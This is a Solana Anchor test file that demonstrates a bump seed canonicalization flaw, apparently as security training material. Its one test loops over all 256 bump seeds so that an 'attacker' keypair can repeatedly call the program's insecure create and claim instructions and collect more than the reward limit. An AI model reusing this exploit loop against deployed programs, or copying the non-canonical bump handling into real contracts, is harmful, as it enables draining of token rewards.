import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { BumpSeedCanonicalization } from "../target/types/bump_seed_canonicalization";
import { Keypair, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { airdropIfRequired } from "@solana-developers/helpers";
import {
  createMint,
  getAccount,
  getAssociatedTokenAddress,
} from "@solana/spl-token";
import { expect } from "chai";

describe("Bump seed canonicalization", () => {
  // Configure the client to use the local cluster.
  anchor.setProvider(anchor.AnchorProvider.env());

  const program = anchor.workspace
    .BumpSeedCanonicalization as Program<BumpSeedCanonicalization>;
  const connection = anchor.getProvider().connection;

  let payer: Keypair;
  let mint: anchor.web3.PublicKey;
  let mintAuthority: anchor.web3.PublicKey;

  before(async () => {
    payer = Keypair.generate();
    await airdropIfRequired(
      connection,
      payer.publicKey,
      2 * LAMPORTS_PER_SOL,
      1 * LAMPORTS_PER_SOL
    );

    [mintAuthority] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("mint")],
      program.programId
    );

    mint = await createMint(connection, payer, mintAuthority, mintAuthority, 0);
  });

  it("allows attacker to claim more than reward limit with insecure instructions", async () => {
    try {
      const attacker = Keypair.generate();
      await airdropIfRequired(
        connection,
        attacker.publicKey,
        1 * LAMPORTS_PER_SOL,
        1 * LAMPORTS_PER_SOL
      );
      const ataKey = await getAssociatedTokenAddress(mint, attacker.publicKey);

      let numClaims = 0;

      for (let i = 0; i < 256; i++) {
        try {
          const pda = anchor.web3.PublicKey.createProgramAddressSync(
            [attacker.publicKey.toBuffer(), Buffer.from([i])],
            program.programId
          );
          await program.methods
            .createUserInsecure(i)
            .accounts({
              user: pda,
              payer: attacker.publicKey,
            })
            .signers([attacker])
            .rpc();
          await program.methods
            .claimInsecure(i)
            .accounts({
              user: pda,
              mint,
              payer: attacker.publicKey,
              userAta: ataKey,
              mintAuthority,
              tokenProgram: anchor.utils.token.TOKEN_PROGRAM_ID,
              associatedTokenProgram: anchor.utils.token.ASSOCIATED_PROGRAM_ID,
              systemProgram: anchor.web3.SystemProgram.programId,
              rent: anchor.web3.SYSVAR_RENT_PUBKEY,
            })
            .signers([attacker])
            .rpc();

          numClaims += 1;
        } catch (error) {
          if (
            error instanceof Error &&
            !error.message.includes(
              "Invalid seeds, address must fall off the curve"
            )
          ) {
            console.error(error);
          }
        }
      }

      const ata = await getAccount(connection, ataKey);

      console.log(
        `Attacker claimed ${numClaims} times and got ${Number(
          ata.amount
        )} tokens`
      );

      expect(numClaims).to.be.greaterThan(1);
      expect(Number(ata.amount)).to.be.greaterThan(10);
    } catch (error) {
      throw new Error(`Test failed: ${error.message}`);
    }
  });
});
